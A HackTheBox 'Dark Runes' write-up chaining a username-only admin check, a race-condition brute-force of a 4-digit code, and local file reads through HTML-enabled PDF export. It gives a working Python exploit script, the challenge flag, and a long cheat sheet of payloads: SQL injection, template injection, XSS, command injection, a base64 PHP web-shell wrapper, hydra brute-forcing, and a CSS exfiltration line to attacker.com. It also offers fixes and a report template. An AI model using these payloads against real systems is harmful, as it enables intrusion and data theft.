# HackTheBox - Dark Runes Challenge Writeup

## Challenge Information

- **Name:** Dark Runes
- **Type:** Web Application Security
- **Difficulty:** Medium
- **Flag:** `HTB{F0rs33_3num3r3t3_F!nd_3XplOit}`

---

## Table of Contents

1. [Initial Reconnaissance](https://claude.ai/chat/542ab888-a913-48cd-8fef-cfc3b0f84e59#initial-reconnaissance)
2. [Source Code Analysis](https://claude.ai/chat/542ab888-a913-48cd-8fef-cfc3b0f84e59#source-code-analysis)
3. [Vulnerability Discovery](https://claude.ai/chat/542ab888-a913-48cd-8fef-cfc3b0f84e59#vulnerability-discovery)
4. [Exploitation](https://claude.ai/chat/542ab888-a913-48cd-8fef-cfc3b0f84e59#exploitation)
5. [Lessons Learned](https://claude.ai/chat/542ab888-a913-48cd-8fef-cfc3b0f84e59#lessons-learned)
6. [Cheat Sheet & Methodology](https://claude.ai/chat/542ab888-a913-48cd-8fef-cfc3b0f84e59#cheat-sheet--methodology)

---

## Initial Reconnaissance

### Target Information

- **URL:** `http://154.57.164.77:31726/`
- **Technology:** Express.js (Node.js)
- **Response Header:** `X-Powered-By: Express`

### Directory Enumeration

Using gobuster to discover endpoints:

```bash
gobuster dir -u http://154.57.164.77:31726/ -w /path/to/wordlist.txt
```

**Discovered Endpoints:**

- `/login` - User authentication
- `/register` - User registration
- `/documents` - Document management interface
- `/css` - Static CSS files

### Application Features

- User registration and authentication
- Document creation and viewing
- Cookie-based session management
- Document signatures displayed in UI

---

## Source Code Analysis

### Cookie Structure Analysis

**Cookie Format:**

```
user=<base64_json>-<hmac_signature>
```

**Example:**

```
user=eyJ1c2VybmFtZSI6InRlbXAiLCJpZCI6MX0%3D-cab8f98d720f59586f93d206dd0ab78e3d877521eb27f07e3f6598d8f5e38009
```

**Decoded Base64:**

```json
{"username":"temp","id":1}
```

**Signature Generation (from `crypto.js`):**

```javascript
const signString = (s) =>
  crypto
    .createHash("sha256")
    .update(s + SECRET)
    .digest("hex");
```

The signature is: `SHA256(base64_json + SECRET)`

### Key Files Review

#### 1. `crypto.js` - Cryptographic Functions

```javascript
const generateRandomString = (length = 16) =>
  crypto.randomBytes(length).toString("hex");

const SECRET = generateRandomString(32); // 64 hex chars

const signString = (s) =>
  crypto
    .createHash("sha256")
    .update(s + SECRET)
    .digest("hex");
```

**Key Observations:**

- SECRET is generated with `crypto.randomBytes(32)` = 64 hex characters
- Used for HMAC-like cookie signing
- Regenerated on each server restart

#### 2. `middlewares.js` - Authentication Middleware

```javascript
const isAuthenticated = (req, res, next) => {
  const token = req.cookies.user;
  if (!token) return res.status(401).send("Unauthorized");
  if (!validate(token)) return res.status(401).send("Unauthorized");
  
  const user = JSON.parse(atob(token.split("-")[0]));
  req.user = user;
  return next();
};

const isAdmin = (req, res, next) => {
  if (req.user.username === "admin") {  // ⚠️ VULNERABILITY
    return next();
  }
  return res.status(403).send("Forbidden");
};
```

**Critical Vulnerability:** `isAdmin` only checks if `username === "admin"`, not the user ID or any other attribute!

#### 3. `documents.js` - Document Routes

```javascript
router.post("/documents", isAuthenticated, (req, res) => {
  const { content } = req.body;
  const sanitizedContent = sanitizeHtml(content, {
    allowedAttributes: {
      ...sanitizeHtml.defaults.allowedAttributes,
      a: ["style"],  // Allows style attributes on anchor tags
    },
  });
  
  const integrity = signString(content);
  addDocument(user.id, sanitizedContent, integrity);
  return res.redirect(`/documents`);
});
```

**Key Points:**

- Documents are sanitized with `sanitize-html`
- Document signatures are stored and displayed
- Content is rendered as HTML when viewing documents

#### 4. `generate.js` - PDF Export Routes

```javascript
router.get("/document/export/:id", isAuthenticated, isAdmin, async (req, res) => {
  const document = findDocument(user.id, id);
  const content = nhm.translate(document.content); // HTML → Markdown
  const generatedPDF = await generatePDF(content);
  // ... return PDF
});

router.post("/document/debug/export", isAuthenticated, isAdmin, async (req, res) => {
  const { access_pass, content } = req.body;
  
  if (!verifyPass(access_pass)) {
    rotatePass();  // ⚠️ Rotates pass on wrong attempt
    return res.status(403).send("BAD PASS, WHO ARE YOU STRANGER ?!");
  }
  
  const generatedPDF = await generatePDF(content);  // Direct to PDF, no HTML→Markdown
  return res.send(generatedPDF);
});
```

**Key Differences:**

- `/export/:id` - Converts HTML → Markdown → PDF
- `/debug/export` - Direct content → PDF (no conversion)
- Both require admin access
- Debug endpoint requires 4-digit access code

#### 5. `pass.js` - Access Code Management

```javascript
let ACCESS_PASS = generateRandomString(32);  // Initially 64 hex chars

const rotatePass = () => {
  try {
    if (fs.existsSync(String(ACCESS_PASS)))
      fs.unlinkSync(String(ACCESS_PASS));
    
    ACCESS_PASS = generateAccessCode();  // ⚠️ Overwrites to 4-digit code
    
    fs.writeFileSync(
      String(ACCESS_PASS),
      `You Access Code is "${generateRandomString(4)}". Please use it to access the debug features`,
    );
  } catch (e) {
    console.error("Error generating pass", e);
  }
};

const generateAccessCode = () => {
  const randomBytes = crypto.randomBytes(2);
  const secureCode = (randomBytes.readUInt16BE() % 10000)
    .toString()
    .padStart(4, "0");
  return secureCode;  // Returns 0000-9999
};
```

**Key Observations:**

- Access code is only 4 digits (0000-9999)
- `rotatePass()` is called on wrong password attempts
- Creates files with the code as the filename

#### 6. `exporter.js` - PDF Generation

```javascript
var markdownpdf = require("markdown-pdf");

const generatePDF = async (content) => {
  return new Promise((resolve, reject) => {
    markdownpdf({ remarkable: { html: true } })  // ⚠️ HTML enabled
      .from.string(content)
      .to.buffer(undefined, (err, buffer) => {
        if (err != null) return reject(err);
        return resolve(buffer);
      });
  });
};
```

**Vulnerability:** `markdown-pdf` with `{ html: true }` allows HTML/JavaScript execution during PDF generation (Server-Side XSS / LFI)

---

## Vulnerability Discovery

### Vulnerability #1: Broken Access Control (CRITICAL)

**Location:** `middlewares.js` - `isAdmin()` function

**Code:**

```javascript
const isAdmin = (req, res, next) => {
  if (req.user.username === "admin") {
    return next();
  }
  return res.status(403).send("Forbidden");
};
```

**Issue:** The middleware only validates that the username equals "admin", not whether the user is the legitimate admin account (ID=1).

**Impact:** Any user can register with the username "admin" and gain administrative privileges.

**Proof of Concept:**

```bash
# Register a new account with username "admin"
curl -X POST http://target/register \
  -d "username=admin&password=test123"

# Login generates a valid admin cookie
# Cookie: {"username":"admin","id":2}
```

### Vulnerability #2: Race Condition on Access Code

**Location:** `pass.js` and `generate.js`

**Issue:** When an incorrect `access_pass` is submitted to `/document/debug/export`, the `rotatePass()` function is called, which generates a new 4-digit code. This creates a race condition window.

**Code Flow:**

```javascript
// In generate.js
if (!verifyPass(access_pass)) {
  rotatePass();  // New code generated
  return res.status(403).send("BAD PASS");
}
```

**Exploitation:** By sending 10,000 parallel requests (one for each possible code 0000-9999), one request will contain the correct code before `rotatePass()` changes it.

### Vulnerability #3: Server-Side XSS / Local File Inclusion

**Location:** `exporter.js` - PDF generation

**Vulnerable Configuration:**

```javascript
markdownpdf({ remarkable: { html: true } })
```

**Issue:** The `markdown-pdf` library version 11.0.0 with `{ html: true }` allows arbitrary HTML/JavaScript execution during PDF generation.

**Known CVE:** This configuration is vulnerable to Server-Side XSS, allowing local file reads.

**Exploitation Payloads:**

```html
<!-- Read local files -->
<iframe src="file:///flag.txt"></iframe>
<embed src="file:///app/flag.txt">
<object data="file:///etc/passwd"></object>

<!-- JavaScript execution -->
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///flag.txt");
x.send();
</script>
```

---

## Exploitation

### Step 1: Bypass Admin Authentication

**Exploit the Broken Access Control:**

1. Register a new account with username "admin":

```http
POST /register HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded

username=admin&password=anypassword123
```

2. Login with the new credentials:

```http
POST /login HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded

username=admin&password=anypassword123
```

3. Receive admin cookie:

```
user=eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjJ9-71a96fe7f8a7121f1e117218f8815f4a65173f335adc3394809797731bf2202a
```

**Decoded:** `{"username":"admin","id":2}`

### Step 2: Race Condition Brute-Force

**Create Python Exploitation Script:**

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# Configuration
TARGET_URL = "http://154.57.164.68:31423/document/debug/export"
ADMIN_COOKIE = "user=eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjJ9-71a96fe7f8a7121f1e117218f8815f4a65173f335adc3394809797731bf2202a"

# LFI Payload to read the flag
LFI_PAYLOAD = "<iframe src='file:///flag.txt' width='800px' height='1000px'></iframe>"

def attempt_code(code):
    """Attempt a single access code"""
    formatted_code = str(code).zfill(4)
    
    data = {
        "access_pass": formatted_code,
        "content": LFI_PAYLOAD
    }
    
    headers = {
        "Cookie": ADMIN_COOKIE,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        response = requests.post(TARGET_URL, data=data, headers=headers, timeout=10)
        
        # Success if we don't see "BAD PASS"
        if "BAD PASS" not in response.text:
            print(f"\n[+] SUCCESS! Access Code: {formatted_code}")
            
            # Save the PDF containing the flag
            with open("flag.pdf", "wb") as f:
                f.write(response.content)
            print("[+] PDF saved to flag.pdf")
            return True
            
    except Exception as e:
        pass
    
    return False

print(f"[*] Starting race condition brute-force...")
print(f"[*] Target: {TARGET_URL}")
print(f"[*] Trying all codes from 0000 to 9999 in parallel...")

# Execute parallel requests
with ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(attempt_code, range(10000))
    
    for res in results:
        if res:
            executor.shutdown(wait=False)
            break

print("[*] Attack completed!")
```

**Alternative File Paths to Try:**

- `/flag.txt`
- `/app/flag.txt`
- `/root/flag.txt`
- `/home/flag.txt`
- `flag.txt` (current directory)

### Step 3: Execute and Retrieve Flag

1. Run the Python script:

```bash
python3 exploit.py
```

2. Wait for successful race condition:

```
[*] Starting race condition brute-force...
[*] Target: http://154.57.164.68:31423/document/debug/export
[*] Trying all codes from 0000 to 9999 in parallel...

[+] SUCCESS! Access Code: 3847
[+] PDF saved to flag.pdf
[*] Attack completed!
```

3. Open the PDF file:

```bash
open flag.pdf
# or
xdg-open flag.pdf
```

4. **Flag Retrieved:** `HTB{F0rs33_3num3r3t3_F!nd_3XplOit}`

---

## Lessons Learned

### Security Takeaways

1. **Access Control Must Be Robust**
    
    - Never rely solely on username checks for authorization
    - Always validate against actual user roles/IDs stored in a secure manner
    - Use proper RBAC (Role-Based Access Control) systems
2. **Race Conditions Are Real**
    
    - Short numeric codes (4 digits = 10,000 possibilities) are vulnerable to parallel brute-forcing
    - Implement rate limiting on sensitive endpoints
    - Use longer, cryptographically secure tokens
3. **Server-Side Template Rendering Is Dangerous**
    
    - Never enable HTML/JavaScript execution in server-side rendering without strict input validation
    - Keep libraries updated (markdown-pdf 11.0.0 is vulnerable)
    - Sandbox PDF generation processes
    - Disable unnecessary features like `{ html: true }`
4. **Defense in Depth**
    
    - Multiple vulnerabilities were chained together
    - Each vulnerability alone might be less severe
    - Combined, they led to full system compromise

### Developer Best Practices

```javascript
// ❌ BAD - Vulnerable Admin Check
const isAdmin = (req, res, next) => {
  if (req.user.username === "admin") {
    return next();
  }
  return res.status(403).send("Forbidden");
};

// ✅ GOOD - Proper Admin Check
const isAdmin = (req, res, next) => {
  // Check against actual admin user ID from database
  if (req.user.id === 1 && req.user.role === "admin") {
    return next();
  }
  return res.status(403).send("Forbidden");
};

// ✅ BETTER - Use proper role management
const isAdmin = (req, res, next) => {
  const user = db.getUserById(req.user.id);
  if (user && user.role === "admin" && user.verified) {
    return next();
  }
  return res.status(403).send("Forbidden");
};
```

```javascript
// ❌ BAD - Short numeric codes
const generateAccessCode = () => {
  return (Math.random() * 10000).toString().padStart(4, "0");
};

// ✅ GOOD - Long cryptographic tokens
const generateAccessCode = () => {
  return crypto.randomBytes(32).toString("hex"); // 64 chars
};
```

```javascript
// ❌ BAD - Enabling HTML in PDF generation
markdownpdf({ remarkable: { html: true } })

// ✅ GOOD - Disable HTML and sanitize
markdownpdf({ 
  remarkable: { 
    html: false,
    breaks: true 
  } 
})
```

---

## Cheat Sheet & Methodology

### Web Application Testing Methodology

#### Phase 1: Reconnaissance

```bash
# Port scanning
nmap -sC -sV -oA nmap_scan target.htb

# Directory enumeration
gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.htb/FUZZ -w wordlist.txt

# Technology fingerprinting
whatweb http://target.htb
wappalyzer (browser extension)

# Check HTTP headers
curl -I http://target.htb
```

#### Phase 2: Source Code Analysis (If Available)

```bash
# Download and extract challenge files
unzip challenge.zip

# File structure analysis
tree -L 3
find . -type f -name "*.js"

# Search for sensitive information
grep -r "password" .
grep -r "secret" .
grep -r "key" .
grep -r "token" .

# Look for configuration files
find . -name "*.json" -o -name "*.yaml" -o -name "*.conf"

# Database files
find . -name "*.db" -o -name "*.sqlite"

# Check package versions for known vulnerabilities
cat package.json
npm audit
```

#### Phase 3: Authentication Testing

**Cookie Analysis:**

```bash
# Decode base64 cookies
echo "eyJ1c2VybmFtZSI6InRlc3QifQ==" | base64 -d

# Analyze cookie structure
# Format: <data>-<signature>
# Check if signature is HMAC, JWT, or custom

# Try cookie manipulation
# Change user ID, username, role fields
# Test if signature validation is enforced
```

**Common Authentication Bypasses:**

```
1. SQL Injection in login forms
   ' OR '1'='1
   admin' --
   
2. Username enumeration
   - Different error messages for valid/invalid users
   
3. Weak password policies
   - admin/admin, admin/password, admin/123456
   
4. Registration bypass
   - Register as "admin" (check case sensitivity)
   - Register with admin@company.com
   - Register with special characters: admin', "admin", admin--
   
5. JWT vulnerabilities
   - None algorithm attack
   - Weak signing keys
   - Key confusion attacks
```

#### Phase 4: Access Control Testing

**Horizontal Privilege Escalation:**

```
Test accessing other users' resources by changing IDs:
- /user/1/profile → /user/2/profile
- /document/123 → /document/124
- Cookie: user_id=1 → user_id=2
```

**Vertical Privilege Escalation:**

```
Test admin functionality as regular user:
- Register as "admin", "administrator", "root"
- Modify user role in cookies/tokens
- Access admin endpoints directly: /admin, /dashboard, /manage
- Test IDOR on admin resources: /admin/user/1
```

**Common RBAC Vulnerabilities:**

```javascript
// Vulnerable pattern: checking only username
if (req.user.username === "admin") { }

// Vulnerable pattern: client-side role checks
if (req.body.isAdmin === "true") { }

// Vulnerable pattern: no authorization check
app.get("/admin/delete/:id", (req, res) => {
  deleteUser(req.params.id); // No role check!
});
```

#### Phase 5: Race Condition Testing

**When to Test for Race Conditions:**

- Short numeric codes/tokens
- OTP/2FA codes
- Coupon/promo codes
- Resource allocation (limited quantities)
- Password reset tokens
- API rate limits

**Testing Methodology:**

```python
# Basic race condition test
from concurrent.futures import ThreadPoolExecutor

def attempt():
    response = requests.post(url, data=payload)
    return response

with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(attempt) for _ in range(10000)]
    results = [f.result() for f in futures]
```

**Burp Suite Turbo Intruder:**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for i in range(10000):
        code = str(i).zfill(4)
        engine.queue(target.req, code)

def handleResponse(req, interesting):
    if "BAD PASS" not in req.response:
        table.add(req)
```

#### Phase 6: Server-Side Vulnerabilities

**Server-Side Template Injection (SSTI):**

```
Test payloads:
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}

Common frameworks:
- Jinja2 (Python): {{config.items()}}
- ERB (Ruby): <%= system("id") %>
- Freemarker (Java): ${7*7}
- Twig (PHP): {{_self.env.registerUndefinedFilterCallback("exec")}}
```

**Server-Side XSS / PDF Generation:**

```html
<!-- Test basic HTML rendering -->
<h1>Test</h1>
<img src=x onerror=alert(1)>

<!-- Local file inclusion -->
<iframe src="file:///etc/passwd"></iframe>
<embed src="file:///flag.txt">
<object data="file:///app/config.json"></object>

<!-- JavaScript execution (if allowed) -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///flag.txt', false);
xhr.send();
document.write(xhr.responseText);
</script>

<!-- CSS-based exfiltration -->
<style>
@import url('http://attacker.com/?data=SECRET');
</style>

<link rel="stylesheet" href="file:///flag.txt">
```

**Common Vulnerable Libraries:**

```
- markdown-pdf (< 11.0.1) - HTML injection
- wkhtmltopdf - SSRF, LFI via file:// protocol
- PhantomJS - XSS, file access
- Puppeteer (misconfigured) - Chrome DevTools Protocol abuse
- WeasyPrint - File system access
```

#### Phase 7: Input Validation Bypass

**HTML Sanitization Bypass:**

```html
<!-- Test what's allowed -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Attribute-based XSS -->
<a href="javascript:alert(1)">click</a>
<a style="background:url('javascript:alert(1)')">test</a>

<!-- CSS injection -->
<a style="position:absolute;top:0;left:0;width:100%;height:100%">overlay</a>

<!-- HTML entity encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- Unicode bypass -->
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

### Quick Reference Commands

```bash
# === RECON ===
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com

# Directory brute-force
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
feroxbuster -u http://target.com -w wordlist.txt

# === AUTHENTICATION ===
# Test default credentials
hydra -L users.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# JWT analysis
jwt_tool eyJhbGc... -M at  # All tests

# === PARAMETER FUZZING ===
# Find hidden parameters
arjun -u http://target.com/api/endpoint
ffuf -u http://target.com/api?FUZZ=test -w params.txt

# === SQL INJECTION ===
# Automated testing
sqlmap -u "http://target.com?id=1" --batch --random-agent

# Manual testing
' OR '1'='1
1' ORDER BY 1--
1' UNION SELECT NULL--

# === FILE UPLOAD ===
# Test file upload restrictions
file.php, file.php.jpg, file.php%00.jpg
.htaccess upload, web.config upload
Change Content-Type header

# === RACE CONDITIONS ===
# Using ffuf with threads
ffuf -u http://target.com/api -w codes.txt -t 100

# Using GNU parallel
parallel -j 100 curl -X POST http://target.com/api -d 'code={}' ::: {0000..9999}

# === LOCAL FILE INCLUSION ===
# Common paths
/etc/passwd
/etc/shadow
/var/www/html/index.php
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input (with POST data)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# === REMOTE CODE EXECUTION ===
# Test command injection
; id
| whoami
`uname -a`
$(cat /etc/passwd)

# === API TESTING ===
# Enumerate endpoints
/api/v1/users
/api/v1/admin
/api/v2/internal

# Test HTTP methods
curl -X OPTIONS http://target.com/api
curl -X PUT http://target.com/api -d '{"admin":true}'
curl -X DELETE http://target.com/api/user/1

# Mass assignment
{"username":"test", "role":"admin", "isAdmin":true}
```

### Tools Checklist

**Essential Tools:**

- [ ] Burp Suite Professional / Community
- [ ] OWASP ZAP
- [ ] gobuster / ffuf / feroxbuster
- [ ] sqlmap
- [ ] nikto
- [ ] wfuzz
- [ ] nmap
- [ ] curl / httpie
- [ ] jwt_tool
- [ ] CyberChef (for encoding/decoding)

**Wordlists:**

- [ ] SecLists (https://github.com/danielmiessler/SecLists)
- [ ] FuzzDB
- [ ] PayloadsAllTheThings
- [ ] Custom wordlists for specific targets

**Browser Extensions:**

- [ ] Wappalyzer (technology detection)
- [ ] Cookie-Editor
- [ ] FoxyProxy (proxy switching)
- [ ] HackBar
- [ ] EditThisCookie

### Common Vulnerability Patterns

#### Pattern 1: Insecure Direct Object References (IDOR)

```
Vulnerable endpoint: /api/user/123/profile
Test: /api/user/124/profile (access other users)

Vulnerable cookie: user_id=123
Test: user_id=124

Vulnerable parameter: ?document_id=1
Test: ?document_id=2
```

#### Pattern 2: Broken Function Level Authorization

```javascript
// Missing authorization check
app.delete('/admin/user/:id', (req, res) => {
  deleteUser(req.params.id); // ❌ No admin check
});

// Weak authorization check
app.get('/admin/panel', (req, res) => {
  if (req.query.admin === 'true') { // ❌ Client-controlled
    showAdminPanel();
  }
});
```

#### Pattern 3: Mass Assignment

```javascript
// Vulnerable to mass assignment
app.post('/profile', (req, res) => {
  User.update(req.body); // ❌ Updates any field from request
});

// Attack payload:
// {"username":"test", "role":"admin", "credits":99999}
```

#### Pattern 4: JWT Vulnerabilities

```
1. Algorithm confusion (RS256 → HS256)
2. None algorithm bypass
3. Weak signing key (brute-forceable)
4. Missing expiration validation
5. Token not invalidated on logout
```

#### Pattern 5: Race Conditions

```
Vulnerable scenarios:
1. OTP/2FA codes with limited attempts
2. Coupon codes with single use
3. Limited quantity purchases
4. File upload rate limits
5. Password reset tokens
```

### Reporting Template

```markdown
# Vulnerability Report: [Vulnerability Name]

## Severity: [Critical/High/Medium/Low]

## Summary
Brief description of the vulnerability and its impact.

## Vulnerability Details
- **Type:** [e.g., Broken Access Control, Race Condition, SSTI]
- **Location:** [Endpoint, file, function]
- **CWE:** [CWE-XXX if applicable]

## Proof of Concept

### Step 1: [Action]
```

[Code/Command/Request]

```

### Step 2: [Action]
```

[Code/Command/Request]

```

### Result
[Screenshot or output showing successful exploitation]

## Impact
- Confidentiality: [High/Medium/Low]
- Integrity: [High/Medium/Low]
- Availability: [High/Medium/Low]

Detailed description of what an attacker could achieve.

## Remediation
1. **Immediate fix:**
   - [Quick patch to mitigate]

2. **Long-term solution:**
   - [Proper fix with code examples]

3. **Best practices:**
   - [Additional security measures]

## References
- [Relevant CVEs, articles, documentation]
```

---

## Additional Resources

### Learning Platforms

- HackTheBox: https://www.hackthebox.com
- TryHackMe: https://tryhackme.com
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- PentesterLab: https://pentesterlab.com

### Reference Materials

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/

### Vulnerability Databases

- CVE Details: https://www.cvedetails.com/
- Exploit-DB: https://www.exploit-db.com/
- Snyk Vulnerability DB: https://security.snyk.io/

---

## Conclusion

The Dark Runes challenge demonstrated a realistic attack chain combining multiple vulnerabilities:

1. **Broken Access Control** - Allowed unauthorized admin access
2. **Race Condition** - Enabled brute-forcing of access codes
3. **Server-Side XSS/LFI** - Permitted local file reading via PDF generation

Key takeaways:

- Always validate authorization properly (never trust usernames alone)
- Use cryptographically strong tokens (not 4-digit codes)
- Disable dangerous features in server-side rendering libraries
- Implement rate limiting and proper input validation

**Remember:** Security is only as strong as its weakest link. Defense in depth is essential.

---

**Author:** HTB Player  
**Date:** February 2026  
**Challenge:** Dark Runes  
**Flag:** `HTB{F0rs33_3num3r3t3_F!nd_3XplOit}`